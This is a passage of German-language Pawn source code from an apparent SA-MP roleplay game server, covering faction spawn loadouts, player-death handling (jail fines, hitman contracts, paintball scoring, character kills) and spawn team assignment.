		SetPlayerHealth(playerid,100);
//		ServerWeapon(playerid,24,100);
		ServerWeapon(playerid,41,500);
		return 1;
	}
	if (PlayerInfo[playerid][pMember] == 7|| PlayerInfo[playerid][pLeader] == 7)//Bodyguard von San Andreas Präsident
	{
		SetPlayerHealth(playerid,100);
//	    ServerWeapon(playerid,41, 500);//Baseball
		ServerWeapon(playerid,24, 307); //Deagle
//		ServerWeapon(playerid,31, 500); //M4
	}
	if (PlayerInfo[playerid][pMember] == 8 || PlayerInfo[playerid][pLeader] == 8)//Hitman
	{
		SetPlayerHealth(playerid,100);
//		ServerWeapon(playerid,29, 500);//Baseball
		ServerWeapon(playerid,24, 307); //Deagle
		ServerWeapon(playerid,31, 500); //M4
		return 1;
	}
	if (PlayerInfo[playerid][pMember] == 9 || PlayerInfo[playerid][pLeader] == 9)//San News
	{
		SetPlayerHealth(playerid,100);
//	    ServerWeapon(playerid,5,1);
		ServerWeapon(playerid,41,500);
//		ServerWeapon(playerid,43,999999);
		return 1;
	}
	if (PlayerInfo[playerid][pMember] == 10 || PlayerInfo[playerid][pLeader] == 10)//TAXI
	{
		SetPlayerHealth(playerid,100);
//	    ServerWeapon(playerid,5,1);
//		ServerWeapon(playerid,41,500);
		return 1;
	}
	if (PlayerInfo[playerid][pMember] == 11 || PlayerInfo[playerid][pLeader] == 11)//Fahrschule
	{
		SetPlayerHealth(playerid,100);
//		ServerWeapon(playerid,41,10000);
		return 1;
	}
	if (PlayerInfo[playerid][pMember] == 12 || PlayerInfo[playerid][pLeader] == 12)//Bikers
	{
		SetPlayerHealth(playerid,100);
//		ServerWeapon(playerid,29, 500);//Baseball
//		ServerWeapon(playerid,24, 307); //Deagle
//		ServerWeapon(playerid,31, 500); //M4
		return 1;
	}
	if(PlayerInfo[playerid][pMember] == 13 || PlayerInfo[playerid][pLeader] == 13)//Grove
	{
		SetPlayerHealth(playerid,100);
//		ServerWeapon(playerid,29, 500);//Baseball
//		ServerWeapon(playerid,24, 307); //Deagle
//		ServerWeapon(playerid,31, 500); //M4
		return 1;
	}
	if(PlayerInfo[playerid][pMember] == 14 || PlayerInfo[playerid][pLeader] == 14)//Ballas
	{
		SetPlayerHealth(playerid,100);
//		ServerWeapon(playerid,29, 500);//Baseball
//		ServerWeapon(playerid,24, 307); //Deagle
//		ServerWeapon(playerid,31, 500); //M4
		return 1;
	}
	if(PlayerInfo[playerid][pMember] == 15 || PlayerInfo[playerid][pLeader] == 15)//Ls Biker Club
	{
		SetPlayerHealth(playerid,100);
//		ServerWeapon(playerid,29, 500);//Baseball
//		ServerWeapon(playerid,24, 307); //Deagle
//		ServerWeapon(playerid,31, 500); //M4
		return 1;
	}
	if(PlayerInfo[playerid][pMember] == 16 || PlayerInfo[playerid][pLeader] == 16)//Vagos
	{
		SetPlayerHealth(playerid,100);
//		ServerWeapon(playerid,29, 500);//Baseball
//		ServerWeapon(playerid,24, 307); //Deagle
//		ServerWeapon(playerid,31, 500); //M4
		return 1;
	}
	if(PlayerInfo[playerid][pMember] == 17 || PlayerInfo[playerid][pLeader] == 17)//Aztecas
	{
		SetPlayerHealth(playerid,100);
//		ServerWeapon(playerid,29, 500);//Baseball
//		ServerWeapon(playerid,24, 307); //Deagle
//		ServerWeapon(playerid,31, 500); //M4
		return 1;
	}
	if(PlayerInfo[playerid][pMember] == 18 || PlayerInfo[playerid][pLeader] == 18)//LS Rifa
	{
		SetPlayerHealth(playerid,100);
//		ServerWeapon(playerid,29, 500);//Baseball
//		ServerWeapon(playerid,24, 307); //Deagle
//		ServerWeapon(playerid,31, 500); //M4
		return 1;
	}
	if(PlayerInfo[playerid][pMember] == 19 || PlayerInfo[playerid][pLeader] == 19)// Red Soldiers
	{
//		ServerWeapon(playerid,29, 500);//Baseball
//		ServerWeapon(playerid,24, 307); //Deagle
//		ServerWeapon(playerid,31, 500); //M4
		SetPlayerHealth(playerid,100);
		return 1;
	}
	if(PlayerInfo[playerid][pMember] == 20 || PlayerInfo[playerid][pLeader] == 20)//Terroristen
	{
//		ServerWeapon(playerid,29, 500);//Baseball
		SetPlayerHealth(playerid,100);
//		ServerWeapon(playerid,24, 307); //Deagle
//		ServerWeapon(playerid,31, 500); //M4
		return 1;
	}
	//if(PlayerInfo[playerid][pMember] == 21 || PlayerInfo[playerid][pLeader] == 21)//Wheelmen
	{
		SetPlayerHealth(playerid,100);
	//	ServerWeapon(playerid,29, 500);//Baseball
	//	ServerWeapon(playerid,24, 307); //Deagle
	//	ServerWeapon(playerid,31, 500); //M4
	//	return 1;
	}
	if (PlayerInfo[playerid][pMember] == 23 || PlayerInfo[playerid][pLeader] == 23)//Rm
	{
//		ServerWeapon(playerid,29, 500);//Baseball
//		ServerWeapon(playerid,24, 307); //Deagle
//		ServerWeapon(playerid,31, 500); //M4
		SetPlayerHealth(playerid,100);
		return 1;
	}
	if (PlayerInfo[playerid][pMember] == 24 || PlayerInfo[playerid][pLeader] == 24)//O-amt
	{
//		SetPlayerArmour(playerid,100.0);
//		ServerWeapon(playerid,3,500);
		SetPlayerHealth(playerid,100);
		ServerWeapon(playerid,41,500);
		return 1;
	}
	return 1;
}

//------------------------------------------------------------------------------------------------------

stock MeinName(playerid)
{
	new nam[MAX_PLAYER_NAME];
	GetPlayerName(playerid, nam, sizeof(nam));
	return nam;
}

public OnPlayerDeath(playerid, killerid, reason)
{


	if(IsPlayerConnected(killerid))
	{
		PlayerInfo[killerid][pKills] += 1;
	}
	PlayerInfo[playerid][pVerreckt] += 1;





 	   GetPlayerPos(playerid, PlayerInfo[playerid][pPos_x], PlayerInfo[playerid][pPos_y], PlayerInfo[playerid][pPos_z]);

    new Float:x, Float:y, Float:z;

	GetPlayerPos(playerid, x, y, z);
	new LocationZone[MAX_ZONE_NAME];
	Get2DZone(x,y, LocationZone, MAX_ZONE_NAME);





        // ANTI Fakekiller
        AntiFakekill[playerid]++;
        SetTimerEx("AntiFakekillTimer", 1000,false,"i",playerid);


        if(PlayerInfo[playerid][AktivImEvent] == 1)
        {
            if(killerid !=INVALID_PLAYER_ID)
            {
                PlayerInfo[killerid][EventKills]++;
			}
			return 1;
		}


	    if(playerid != INVALID_PLAYER_ID)
	    {
	        if(playerid == RaketenSys[ZielID])
	        {
	            new string[128];
	            format(string,128,"<< Das Ziel %s wurde von der Rakete in %s erledigt. >>",GetName(playerid),LocationZone);
				SendFamilyMessage(3, COLOR_GREEN, string);
				RaketenSys[ZielID] = INVALID_PLAYER_ID;
			}
		}
	    new string[256];
		if(WantedLevel[playerid] >= 1 && PlayerPaintballing[playerid] != 1)
		{
		    new price = WantedLevel[playerid]*1200;
	         if(IsPlayerConnected(killerid))
	          {
		        if(PlayerInfo[killerid][sMember] == 1 || PlayerInfo[killerid][sMember] == 2 || PlayerInfo[killerid][sMember] == 3 || PlayerInfo[killerid][sMember] == 22)
		          {
		              if(WantedLevel[playerid] >= 6)
			          {
				    	GivePlayerMoneySave(playerid, -price);
				     	PlayerInfo[playerid][pWantedDeaths] += 1;
					    PlayerInfo[playerid][pJailed] = 2;
				        PlayerInfo[playerid][pJailTime] = (WantedLevel[playerid] * 60);
				        format(string, sizeof(string), "Du bist für %d Sekunden im Gefängnis und musst $%d bezahlen.", PlayerInfo[playerid][pJailTime], price);
					    SendClientMessage(playerid, COLOR_LIGHTRED, string);
				        WantedPoints[playerid] = 0;
					    WantedLevel[playerid] = 0;
//					    SetPlayerVirtualWorld(playerid, 60);
			    	    SendClientMessage(playerid, COLOR_LIGHTBLUE, "Alle Anwälte wurden Infomiert!");
                        OnPlayerCommandText(playerid,"/time");
				        }
				        else
				        {
					    GivePlayerMoneySave(playerid, -price);
					    PlayerInfo[playerid][pWantedDeaths] += 1;
					    PlayerInfo[playerid][pJailed] = 1;
				        PlayerInfo[playerid][pJailTime] = (WantedLevel[playerid] * 60);
				        format(string, sizeof(string), "Du bist für %d Sekunden im Gefängnis und musst $%d bezahlen.", PlayerInfo[playerid][pJailTime], price);
				        SendClientMessage(playerid, COLOR_LIGHTRED, string);
				        WantedPoints[playerid] = 0;
					    WantedLevel[playerid] = 0;
			    	    SendClientMessage(playerid, COLOR_LIGHTBLUE, "Alle Anwälte wurden Infomiert!");
                        OnPlayerCommandText(playerid,"/time");
				        }
						format(string, sizeof(string), "~w~Verbrecher getötet ~g~$%d", price/2);
						GameTextForPlayer(killerid, string, 5000, 1);

						GivePlayerMoneySave(killerid, price/2);

					//	FraktionsKasse[1] += price/2;
						PlayerPlaySound(killerid, 1058, 0.0, 0.0, 0.0);
						ResetPlayerWeapons(playerid);

						if(PlayerInfo[playerid][sMember]==1||PlayerInfo[playerid][sMember]==2||PlayerInfo[playerid][sMember]==3||PlayerInfo[playerid][sMember]==22)
						{
							format(string, sizeof(string), "<< %s %s hat den Verdächtigen %s getötet >>",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]),GetName(killerid), GetName(playerid));
							OOCNews(COLOR_LIGHTRED, string);
						}


						/*
						new kosten = time * 60 * 6600;

							FraktionsKasse[6] -= kosten;
							for(new i =0; i<MAX_PLAYERS; i++)
							{
							    if(PlayerInfo[pLeader] == 6)
							    {
							        format(string,sizeof(string),"(Aktuelle Info): %s wurde für %d Minuten eingesperrt. %d$ wurden von der Regierungskasse abgezogen",giveplayer,time*60,kosten);
							        SCM(playerid,-1,string);
								}
							}*/

				}
			}
		}
        new name[MAX_PLAYER_NAME];
	    if(PlayerInfo[playerid][pHeadValue] > 0)
	    {
		    if(IsPlayerConnected(killerid))
		    {
			    if(PlayerInfo[killerid][pMember] == 8 || PlayerInfo[killerid][pLeader] == 8)
			    {
			            ConsumingMoney[killerid] = 1;
						new killer[MAX_PLAYER_NAME];
						new player[MAX_PLAYER_NAME];
						GetPlayerName(killerid, killer, sizeof(killer));
						GetPlayerName(playerid, player, sizeof(player));
						new fkasse = PlayerInfo[playerid][pHeadValue];
						FraktionsKasse[7] += fkasse;
						GivePlayerMoneySave(killerid, PlayerInfo[playerid][pHeadValue]);
						format(string,128,"<< Hitman %s hat den Auftrag an %s erfüllt und bekommt: $%d >>",killer,player,PlayerInfo[playerid][pHeadValue]);
					    WBB_AddPostUserID(1, 24, "Hitman-Log", string, 1, 0, 1, 1, 0, 0, playerid, 1);//521
						SendFamilyMessage(8, COLOR_YELLOW, string);
						PlayerInfo[playerid][pHeadValue] = 0;
	                    GameTextForPlayer(playerid, "~r~Auftragsmord", 5000,1);
	                    SCM(playerid, COLOR_YELLOW, "Du wurdest von einem Hitman wegen eines Auftrags getötet!");
				}
			}
		}

//		PlayerInfo[playerid][pVerreckt] += 1;
//		PlayerInfo[killerid][pKills] += 1;
//	    {
		PlayerInfo[playerid][pTotTime] = 80;
		PlayerInfo[playerid][pTot] = 1;
//        OnPlayerCommandText(playerid,"/time");
//		GetPlayerPos(playerid, pX, pY, pZ);
		new Hour, Minute, Second;
		gettime(Hour, Minute, Second);
		//new Float:x, Float:y, Float:z,
		new name2[MAX_PLAYER_NAME],stringz[128];
		GetPlayerPos(playerid, Float:x, Float:y, Float:z);
		GetPlayerName(playerid, name2, sizeof(name2));
		format(stringz, sizeof(stringz), "%s\n%d:%d:%d", name2,Hour,Minute,Second);


		SetTimerEx("EndAntiSpawnKill", 5000, false, "i", playerid);// Discnecct Icon!! machen


		DeathIcon(playerid,x, y, z);

//		DeathText[playerid] = Create3DTextLabel(stringz,0xFFFFFFAA, Float:x, Float:y, Float:z, 10.0, 0);
//		TotenKopf[playerid] = CreatePickup(1254,0, Float:x, Float:y, Float:z,-1);
		PlayerInfo[playerid][pTx] = pX;
		PlayerInfo[playerid][pTy] = pY;
		PlayerInfo[playerid][pTz] = pZ;
		GetPlayerName(playerid, name, sizeof(name));
		/*
        GetPlayerPos(playerid, x, y, z);
		new LocationZone[MAX_ZONE_NAME];
		Get2DZone(x,y, LocationZone, MAX_ZONE_NAME);*/
		for(new i=0; i<MAX_PLAYERS; i++)
		{
			if(PlayerInfo[i][pMember] == 4 || PlayerInfo[i][pLeader] == 4)
			{
                    if(JobDuty[i] == 1)
                    {


			        	format(string,sizeof(string),"Ein neuer Auftrag ist verfügbar! Spieler: %s, ist gestorben, Ort: %s. /aufträge",name,LocationZone);
			        	SendClientMessage(i,COLOR_LIGHTBLUE,string);
			        }
//					SendClientMessage(i,COLOR_LIGHTBLUE,"Die Position wurde auf dem HUD markiert! (/dc zum löschen)");
//					SetPlayerCheckpoint(i,PlayerInfo[playerid][pTx],PlayerInfo[playerid][pTy],PlayerInfo[playerid][pTz],5.0);
			}
		}
//	}
	PlayerInfo[playerid][pInvWeapon] = 0;
 	PlayerInfo[playerid][pInvAmmo] = 0;
	PlayerInfo[playerid][pInvWeapon2] = 0;
 	PlayerInfo[playerid][pInvAmmo2] = 0;

    if(PlayerInfo[killerid][sMember] == 1 || PlayerInfo[killerid][sMember] == 2 || PlayerInfo[killerid][sMember] == 3|| PlayerInfo[killerid][sMember] == 22 ||PlayerPaintballing[playerid] == 1)
    {
    }
	else
	{
	WantedLevel[killerid] += 1;
    SetPlayerCriminal(killerid,255, "Mord");
	}
	for(new fs;fs<sizeof(FightSystem);fs++)
	{
	    if(FightSystem[fs][fsFightTime])
		{
			if(GetPlayerFaction(playerid) == FightSystem[fs][fsOwnerFaction] || GetPlayerFaction(playerid) == FightSystem[fs][fsAttackFaction])
			{
				PlayerInfo[playerid][pTot] = 0;
				PlayerInfo[playerid][pTotTime] = 0;
//  			    Delete3DTextLabel(DeathText[playerid]);
				RemoveIcon(playerid);

//				DestroyPickup(TotenKopf[playerid]);
			}
		}
	}
	if(PlayerInfo[playerid][pJailed] != 0 || PlayerInfo[playerid][pGangJailed] != 0|| PlayerInfo[playerid][pPrison] != 0)
	{
		PlayerInfo[playerid][pTotTime] = 0;
		PlayerInfo[playerid][pTot] = 0;
//        Delete3DTextLabel(DeathText[playerid]);

		RemoveIcon(playerid);


//		DestroyPickup(TotenKopf[playerid]);
//		GivePlayerMoneySave(playerid, -1000);
//		PlayerInfo[playerid][pTot] = 1;
	}
	if (PlayerPaintballing[playerid] >= 1)
	{
 		PlayerInfo[playerid][pTot] = 0;
		PlayerInfo[playerid][pTotTime] = 0;
	}
	if (!IsACop(killerid) && reason != 49 && PlayerInfo[killerid][pJailed] == 0 && !IstInGangFight(playerid))
	{
	    SetPlayerCriminal(killerid,255, "Vorsätzlicher Mord");
	}
	if (!IsACop(killerid) && reason == 49)
	{
		SetPlayerCriminal(killerid,255, "Fahrerflucht");
	}
	if(gPlayerUsingLoopingAnim[playerid])
	{
        gPlayerUsingLoopingAnim[playerid] = 0;
        TextDrawHideForPlayer(playerid,txtAnimHelper);
	}
	if(BlindFold[playerid] == 1)
	{
		BlindFold[playerid] = 0;
	}
	if(PlayerInfo[playerid][pMauled] == 1)
	{
	    PlayerInfo[playerid][pMauled] = 0;
	}
	InCargo[playerid] = 0; InLevi[playerid] = 0; InEnfo[playerid] = 0;
	if(FirstSpawn[playerid] == 1)
	{
		FirstSpawn[playerid] = 0;
	}
	if(IsBlacklist[playerid]==1)
    {
        ClearBlack(playerid);
        IsBlacklist[playerid]=0;
    }
	gPlayerSpawned[playerid] = 0;
	GetPlayerName(playerid, name, sizeof(name));
	PlayerInfo[playerid][pLocal] = 999;
	if(killerid != 255)
	if(reason == 38)
	{
		new kstring[128];
		new kickname[MAX_PLAYER_NAME];
		if(IsPlayerConnected(killerid))
		{
			GetPlayerName(killerid, kickname, sizeof(kickname));
			format(string, 256, "AdmWarning: [%d] %s hat einen Spieler mit einer Minigun gekillt.",killerid,kickname);
			ABroadCast(COLOR_LIGHTRED,string,1);
			printf("%s", kstring);
		}
	}
	if (gPlayerCheckpointStatus[playerid] > 4 && gPlayerCheckpointStatus[playerid] < 11)
	{
		DisablePlayerCheckpoint(playerid);
		gPlayerCheckpointStatus[playerid] = CHECKPOINT_NONE;
	}
	new caller = Mobile[playerid];
	if(caller != 255)
	{
		if(caller < 255)
		{
			SendClientMessage(caller,  COLOR_GRAD2, "   Die Verbindung wurde unterbrochen....");
			CellTime[caller] = 0;
			CellTime[playerid] = 0;
			Mobile[caller] = 255;
		}
		Mobile[playerid] = 255;
		CellTime[playerid] = 0;
	}
	ClearCrime(playerid);
		if(PlayerPaintballing[playerid] != 0)
		{
		    PlayerPaintballKills[killerid] ++;
		    if(PlayerPaintballKills[killerid] > PaintballWinnerKills)
		    {
		        new killer[MAX_PLAYER_NAME];
		        PaintballWinner = killerid;
		        PaintballWinnerKills = PlayerPaintballKills[killerid];
		        GetPlayerName(killerid, killer, sizeof(killer));
		        for(new i = 0; i < MAX_PLAYERS; i++)
		        {
		            if(IsPlayerConnected(i))
		            {
		                if(PlayerPaintballing[i] != 0)
		                {
		                    format(string, sizeof(string), "* %s ist mit %d Kills in Führung.",killer,PaintballWinnerKills);
							SendClientMessage(i, COLOR_WHITE, string);
		                }
		            }
		        }
		    }
			return 1;
		}
	if(GettingCK[playerid] < 999 || OnCK[playerid] < 999)
	{
	    if(IsPlayerConnected(killerid))
	    {
	        if(GettingCK[killerid] < 999 || OnCK[playerid] < 999)
	        {
	            new killer[MAX_PLAYER_NAME];
	            new dier[MAX_PLAYER_NAME];
	            GetPlayerName(playerid, dier, sizeof(dier));
				GetPlayerName(killerid, killer, sizeof(killer));
	            format(string, sizeof(string), "* %s hat deinen Charakter gesperrt, du kannst nun mit diesem Charakter nicht mehr Spielen.",killer);
	            SendClientMessage(playerid, COLOR_LIGHTRED, string);
	            format(string, sizeof(string), "** %s hat den Spieler %s erledigt**",killer,dier);
	            CKLog(string);
	            PlayerInfo[playerid][pCK] = 1;
	            if(GettingCK[playerid] < 999) { GettingCK[playerid] = 999; }
	            else if(OnCK[playerid] < 999) { OnCK[playerid] = 999; }
	            if(GettingCK[killerid] < 999) { GettingCK[killerid] = 999; }
	            else if(OnCK[killerid] < 999) { OnCK[killerid] = 999; }
	            KickPlayer[playerid] = 1;
	        }
	    }
	}
	GW_OnPlayerDeath(playerid, killerid, reason);
	killerid = INVALID_PLAYER_ID;// ??
	return 1;
}

Function OnPlayerSpawn(playerid)
{

	if(IsPlayerNPC(playerid)) // bei mehreren NPCs abändern
	{
	    new botname[MAX_PLAYER_NAME];
	    if(!strcmp(botname,"NPCGeld",true))
	    {
	        SetPlayerSkin(playerid,43);
			PutPlayerInVehicle(playerid, npcveh,0);
		}
		return 1;
	}
	SetPlayerFightingStyle (playerid, PlayerInfo[playerid][pFightingStyle]);


	if(Spectatepos[playerid] == 1)
	{
		SetPlayerPos(playerid, specx[playerid], specy[playerid], specz[playerid]);
		SetPlayerInterior(playerid, specint[playerid]);
		SetPlayerFacingAngle(playerid, specrot[playerid]); //Player faces north
		SetPlayerVirtualWorld(playerid, specvworld[playerid]);
		SetPlayerSkin(playerid, PlayerInfo[playerid][pChar]);
		Spectatepos[playerid] = 0;
		return 1;
	}
	if(PlayerInfo[playerid][AktivImEvent] == 1)
	{
	    SetPlayerInterior(playerid,Event[EventInterior]); //hätte mir das evinterior eig auch sparen könnnen
	    SetPlayerVirtualWorld(playerid,Event[EventVWOk]);
	    if(Event[EventArt] == 2)
	    {
	        new Random = random(sizeof(EventGranat));
	        SetPlayerPos(playerid, EventGranat[Random][0], EventGranat[Random][1], EventGranat[Random][2]);
	        SetPlayerFacingAngle(playerid, EventGranat[Random][3]);
	        PlayerInfo[playerid][pTot] = 0;
	        SetPlayerInterior(playerid,Event[EventInterior]);
         	SetPlayerVirtualWorld(playerid,Event[EventVWOk]);
	        if(Event[EventGestartet] == 0)
	        {
	            TogglePlayerControllable(playerid,false);
	        }
	        else
			{
				TogglePlayerControllable(playerid,true);
				GiveEventWeapons();
			}
	    }
	    return 1;
	}
	TextDrawShowForPlayer(playerid,Copyright);
	TextDrawShowForPlayer(playerid,Datum);
	GW_OnPlayerSpawn(playerid);

	if(PlayerInfo[playerid][pSkinauswahl] == 1)
	{
		SetPlayerCameraPos(playerid, 1388.4938,-1626.0482,77.4368);
		SetPlayerCameraLookAt(playerid, 1396.1635,-1629.8174,73.7990);
		return 1;
	}
	if(PlayerPaintballing[playerid] != 0)
	{
		ServerWeapon(playerid, 24, 999); // Give playerid a sawn-off shotgun with 64 ammo
		ServerWeapon(playerid, 29, 999); // Give playerid a sawn-off shotgun with 64 ammo
		SetPlayerSkin(playerid, PlayerInfo[playerid][pChar]);
//		SetPlayerSpawn(playerid);
//		return 1;
	}

    if(PlayerInfo[playerid][pTot] == 1)
	{
		SendClientMessage(playerid, COLOR_LIGHTRED, " ");
		SendClientMessage(playerid, COLOR_LIGHTRED, " ");
		SendClientMessage(playerid, COLOR_LIGHTRED, " ");
		SendClientMessage(playerid, COLOR_LIGHTRED, " ");
		SendClientMessage(playerid, COLOR_LIGHTRED, " ");
		SendClientMessage(playerid, COLOR_LIGHTRED, " ");
		SendClientMessage(playerid, COLOR_LIGHTRED, " ");
		SendClientMessage(playerid, COLOR_LIGHTRED, " ");
		SendClientMessage(playerid, COLOR_LIGHTRED, " ");
		SendClientMessage(playerid, COLOR_LIGHTRED, " ");
		SendClientMessage(playerid, COLOR_LIGHTRED, " ");
		SendClientMessage(playerid, COLOR_LIGHTRED, " ");
        GameTextForPlayer(playerid, "~r~Gestorben!", 5000, 3);
		SetPlayerSpawn(playerid);
        SetPlayerSkin(playerid,PlayerInfo[playerid][pChar]);
		ResetPlayerWeapons(playerid);
		return 1;
	}
	STDPlayer[playerid] = 0;
	gTeam[playerid] = PlayerInfo[playerid][pTeam]; //Set the Team
	if (gTeam[playerid] == 4) //medic / criminal reset team
	{
		gTeam[playerid] = 3;
	}
	if(gPlayerLogged[playerid] == 0)
	{
    	SendClientMessage(playerid, COLOR_LIGHTRED, "** Du musst dich vorher einloggen oder dir einen Account erstellen! ***");
		Kick(playerid);
		return 1;
 	}
	if(AtClothes[playerid] == 1)
	{
		PlayerInfo[playerid][pChar] = GetPlayerSkin(playerid);
		PlayerInfo[playerid][pModel] = GetPlayerSkin(playerid);
		AtClothes[playerid] = 0;
	}
	if(gTeam[playerid] == 11 && PlayerInfo[playerid][pLeader] < 1)
	{
	    MedicBill[playerid] = 0;
	    new rand = random(sizeof(CIV));
		SendClientMessage(playerid, COLOR_LIGHTRED, "Du bist kein Chef dieser Familie, du bist Zivilist !");
		PlayerInfo[playerid][pTeam] = 3;
		gTeam[playerid] = 3;
		SetSpawnInfo(playerid, gTeam[playerid], CIV[rand],0.0,0.0,0.0,0,0,0,0,0,0,0);
		PlayerInfo[playerid][pModel] = CIV[rand];
		SpawnPlayer(playerid);
	}
	if(gTeam[playerid] == 5)
	{
	    if(PlayerInfo[playerid][pMember] < 1)
	    {
	        MedicBill[playerid] = 0;
	        new rand = random(sizeof(CIV));
			SendClientMessage(playerid, COLOR_LIGHTRED, "Du bist kein Mitglied dieser Familie, du bist Zivilist !");
			PlayerInfo[playerid][pTeam] = 3;
			gTeam[playerid] = 3;
            SetSpawnInfo(playerid, gTeam[playerid], CIV[rand],0.0,0.0,0.0,0,0,0,0,0,0,0);
			PlayerInfo[playerid][pModel] = CIV[rand];
			SpawnPlayer(playerid);
		}
	}
	if(gTeam[playerid] == 10)
	{
	    if(PlayerInfo[playerid][pMember] != 8)
	    {
	        MedicBill[playerid] = 0;
	        new rand = random(sizeof(CIV));
			SendClientMessage(playerid, COLOR_LIGHTRED, "Du bist kein Mitglied dieser Fraktion, du bist Zivilist !");
			PlayerInfo[playerid][pTeam] = 3;
			gTeam[playerid] = 3;
            SetSpawnInfo(playerid, gTeam[playerid], CIV[rand],0.0,0.0,0.0,0,0,0,0,0,0,0);
			PlayerInfo[playerid][pModel] = CIV[rand];
			SpawnPlayer(playerid);
		}
	}
	if(gTeam[playerid] == 2 && !IsACop(playerid))
	{
	    MedicBill[playerid] = 0;
		new rand = random(sizeof(CIV));
//		SendClientMessage(playerid, COLOR_LIGHTRED, "Du bist kein Polizist!");
		PlayerInfo[playerid][pTeam] = 3;
		gTeam[playerid] = 3;
		SetSpawnInfo(playerid, gTeam[playerid], CIV[rand],0.0,0.0,0.0,0,0,0,0,0,0,0);
		PlayerInfo[playerid][pModel] = CIV[rand];
		SpawnPlayer(playerid);
	}
	if(gTeam[playerid] == 3)
	{
	    if(PlayerInfo[playerid][pMember] > 0 || PlayerInfo[playerid][pLeader] > 0)
	    {
//			SendClientMessage(playerid, COLOR_LIGHTRED, "Du bist kein Polizist!");
			MedicBill[playerid] = 0;
			new model = PlayerInfo[playerid][pChar];
			if(PlayerInfo[playerid][pMember] == 1) { SetSpawnInfo(playerid, 2, model,0.0,0.0,0.0,0,0,0,0,0,0,0); PlayerInfo[playerid][pTeam] = 2; gTeam[playerid] = 2; PlayerInfo[playerid][pModel] = model; }
			else if(PlayerInfo[playerid][pMember] == 2) { SetSpawnInfo(playerid, 2, model,0.0,0.0,0.0,0,0,0,0,0,0,0); PlayerInfo[playerid][pTeam] = 2; gTeam[playerid] = 2; PlayerInfo[playerid][pModel] = model; }
			else if(PlayerInfo[playerid][pMember] == 3) { SetSpawnInfo(playerid, 2, model,0.0,0.0,0.0,0,0,0,0,0,0,0); PlayerInfo[playerid][pTeam] = 2; gTeam[playerid] = 2; PlayerInfo[playerid][pModel] = model; }
			else if(PlayerInfo[playerid][pMember] == 4) { SetSpawnInfo(playerid, 1, model,0.0,0.0,0.0,0,0,0,0,0,0,0); PlayerInfo[playerid][pTeam] = 1; gTeam[playerid] = 1; PlayerInfo[playerid][pModel] = model; }
			else if(PlayerInfo[playerid][pMember] == 5) { SetSpawnInfo(playerid, 5, model,0.0,0.0,0.0,0,0,0,0,0,0,0); PlayerInfo[playerid][pTeam] = 5; gTeam[playerid] = 5; PlayerInfo[playerid][pModel] = model; }
			else if(PlayerInfo[playerid][pMember] == 6) { SetSpawnInfo(playerid, 5, model,0.0,0.0,0.0,0,0,0,0,0,0,0); PlayerInfo[playerid][pTeam] = 5; gTeam[playerid] = 5; PlayerInfo[playerid][pModel] = model; }
			else if(PlayerInfo[playerid][pMember] == 7) { SetSpawnInfo(playerid, 7, model,0.0,0.0,0.0,0,0,0,0,0,0,0); PlayerInfo[playerid][pTeam] = 7; gTeam[playerid] = 7; PlayerInfo[playerid][pModel] = model; }
			else if(PlayerInfo[playerid][pMember] == 8) { SetSpawnInfo(playerid, 10, model,0.0,0.0,0.0,0,0,0,0,0,0,0); PlayerInfo[playerid][pTeam] = 10; gTeam[playerid] = 10; PlayerInfo[playerid][pModel] = model; }
			else if(PlayerInfo[playerid][pMember] == 9) { SetSpawnInfo(playerid, 12, model,0.0,0.0,0.0,0,0,0,0,0,0,0); PlayerInfo[playerid][pTeam] = 12; gTeam[playerid] = 12; PlayerInfo[playerid][pModel] = model; }
			else if(PlayerInfo[playerid][pMember] == 10) { SetSpawnInfo(playerid, 12, model,0.0,0.0,0.0,0,0,0,0,0,0,0); PlayerInfo[playerid][pTeam] = 12; gTeam[playerid] = 12; PlayerInfo[playerid][pModel] = model; }
			else if(PlayerInfo[playerid][pMember] == 11) { SetSpawnInfo(playerid, 12, model,0.0,0.0,0.0,0,0,0,0,0,0,0); PlayerInfo[playerid][pTeam] = 12; gTeam[playerid] = 12; PlayerInfo[playerid][pModel] = model; }
			else if(PlayerInfo[playerid][pMember] == 12) { SetSpawnInfo(playerid, 12, model,0.0,0.0,0.0,0,0,0,0,0,0,0); PlayerInfo[playerid][pTeam] = 12; gTeam[playerid] = 12; PlayerInfo[playerid][pModel] = model; }//Triaden
			else if(PlayerInfo[playerid][pMember] == 13) { SetSpawnInfo(playerid, 13, model,0.0,0.0,0.0,0,0,0,0,0,0,0); PlayerInfo[playerid][pTeam] = 12; gTeam[playerid] = 12; PlayerInfo[playerid][pModel] = model; }//Groove Street
			else if(PlayerInfo[playerid][pMember] == 14) { SetSpawnInfo(playerid, 14, model,0.0,0.0,0.0,0,0,0,0,0,0,0); PlayerInfo[playerid][pTeam] = 12; gTeam[playerid] = 12; PlayerInfo[playerid][pModel] = model; }//Ballas
			else if(PlayerInfo[playerid][pMember] == 15) { SetSpawnInfo(playerid, 15, model,0.0,0.0,0.0,0,0,0,0,0,0,0); PlayerInfo[playerid][pTeam] = 12; gTeam[playerid] = 12; PlayerInfo[playerid][pModel] = model; }//2fast
			else if(PlayerInfo[playerid][pMember] == 16) { SetSpawnInfo(playerid, 16, model,0.0,0.0,0.0,0,0,0,0,0,0,0); PlayerInfo[playerid][pTeam] = 12; gTeam[playerid] = 12; PlayerInfo[playerid][pModel] = model; }//Los Santos Vagos
			else if(PlayerInfo[playerid][pMember] == 17) { SetSpawnInfo(playerid, 17, model,0.0,0.0,0.0,0,0,0,0,0,0,0); PlayerInfo[playerid][pTeam] = 12; gTeam[playerid] = 12; PlayerInfo[playerid][pModel] = model; }//Varios Los Aztecas
			else if(PlayerInfo[playerid][pMember] == 18) { SetSpawnInfo(playerid, 18, model,0.0,0.0,0.0,0,0,0,0,0,0,0); PlayerInfo[playerid][pTeam] = 12; gTeam[playerid] = 12; PlayerInfo[playerid][pModel] = model; }//Los Santos Rifa
			else if(PlayerInfo[playerid][pMember] == 19) { SetSpawnInfo(playerid, 19, model,0.0,0.0,0.0,0,0,0,0,0,0,0); PlayerInfo[playerid][pTeam] = 12; gTeam[playerid] = 12; PlayerInfo[playerid][pModel] = model; }//West Coast Customs
			else if(PlayerInfo[playerid][pMember] == 20) { SetSpawnInfo(playerid, 20, model,0.0,0.0,0.0,0,0,0,0,0,0,0); PlayerInfo[playerid][pTeam] = 12; gTeam[playerid] = 12; PlayerInfo[playerid][pModel] = model; }//
